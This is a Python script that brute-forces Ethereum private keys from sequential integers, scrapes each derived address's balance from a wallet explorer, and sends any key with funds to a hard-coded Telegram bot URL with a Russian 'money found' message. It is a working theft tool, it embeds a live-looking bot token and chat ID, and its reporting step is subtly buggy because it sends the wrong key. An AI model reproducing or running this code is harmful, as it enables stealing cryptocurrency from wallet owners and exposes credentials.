boturl = "https://api.telegram.org/bot5579866377:AAEw7g1cqbXX7L_1ushBzl0gDPIjBgTIXns/sendMessage?chat_id=-656948449&text="

from pydrive.auth import GoogleAuth
from pydrive.drive import GoogleDrive
import dask
from bit.utils import int_to_unknown_bytes, hex_to_bytes, script_push
from bit.crypto import ripemd160_sha256, sha256
from hdwallet import HDWallet
from hdwallet import BIP44HDWallet
from hdwallet.cryptocurrencies import EthereumMainnet as Cryptocurrency
import requests
from lxml import html

gauth = GoogleAuth()
#gauth.LocalWebserverAuth() 
#gauth.SaveCredentialsFile("mycreds.txt")   
gauth.LoadCredentialsFile("mycreds.txt")    
drive = GoogleDrive(gauth) 

file_list = drive.ListFile({'q': 'trashed=false'}).GetList()
file_id = file_list[0]['id'] # get the file ID
file = drive.CreateFile({'id': file_id})
file.GetContentFile('settings.txt')
content = file.GetContentString()
startNumber = int(content.replace('\n',''))

def addToBase(intkey):
        content = file.GetContentString()
        content = content.replace('\n','')
        file.SetContentString(str(int(content)+intkey))
        file.Upload()

cycles = 10000
operations = 100   

@dask.delayed  
def GeneralFunc(n):
        urlblocks=[]
        respone_blocks=[]
        byte_strings=[]
        source_codes=[]
        treetxids=[]
        xVols=[]
        bals=[]
        privs =[]
        addrs=[]
        xpatch_txid = '/html/body/main/div/div[2]/div[1]/table/tbody/tr[2]/td[2]'
        for i in range(operations):
            newstr =int_to_unknown_bytes(n+i)
            hash = sha256(newstr).hex()
            private_key_hex = hash
            privin = int(private_key_hex,16)
            bip44_hdwallet: BIP44HDWallet = BIP44HDWallet(cryptocurrency = Cryptocurrency , account = 0 , change = False ,address = 0)
            bip44_hdwallet.from_private_key(private_key_hex)
            addrs.append(bip44_hdwallet.p2pkh_address())
            privs.append(bip44_hdwallet.private_key())

        for i in range(len(privs)):
            urlblocks.append("https://ethereum.atomicwallet.io/address/"+addrs[i])
        for i in range(len(urlblocks)):
            if len(urlblocks[i])==0:
                continue
            try:
                respone_blocks.append( requests.get(urlblocks[i]))
            except:
                continue
        for i in range(len(respone_blocks)):
            byte_strings.append(respone_blocks[i].content)
        for i in range(len(byte_strings)):
            if len(byte_strings[i])==0:
                continue
            source_codes.append(html.fromstring(byte_strings[i]))
        for i in range(len(source_codes)):
            if len(source_codes[i])==0:
                continue
            treetxids.append(source_codes[i].xpath(xpatch_txid))
        for i in range(len(treetxids)):
            if len(treetxids[i])==0:
                continue
            xVols.append(str(treetxids[i][0].text_content()))
        for i in range(len(xVols)):
            if len(xVols[i])==0:
                continue
            bals.append(xVols[i])
        for i in range(len(bals)):
            if float(bals[i]) > 0:
                requests.get(boturl+"Найдены деньги: "+"("+str(bals[i])+"),"+"\nPass: "+str(private_key_hex))
        print("Searching:", str(privs[0]), "n:", str(n), end="\r")
        
addToBase(cycles)
startNumber+operations

forValue = cycles/operations
StartValue = startNumber-operations
endWhileValue = StartValue +cycles
while StartValue < endWhileValue:
    StartValue=StartValue+operations
    s1 = dask.delayed(GeneralFunc(int(StartValue))) 
    StartValue=StartValue+operations
    s2 = dask.delayed(GeneralFunc(int(StartValue)))
    StartValue=StartValue+operations 
    s3 = dask.delayed(GeneralFunc(int(StartValue)))
    StartValue=StartValue+operations
    s4 = dask.delayed(GeneralFunc(int(StartValue))) 
    StartValue=StartValue+operations
    s5 = dask.delayed(GeneralFunc(int(StartValue))) 
    StartValue=StartValue+operations
    s6 = dask.delayed(GeneralFunc(int(StartValue))) 
    StartValue=StartValue+operations
    s7 = dask.delayed(GeneralFunc(int(StartValue))) 
    StartValue=StartValue+operations
    s8 = dask.delayed(GeneralFunc(int(StartValue))) 

    dask.compute(s1,s2,s3,s4,s5,s6,s7,s8)   
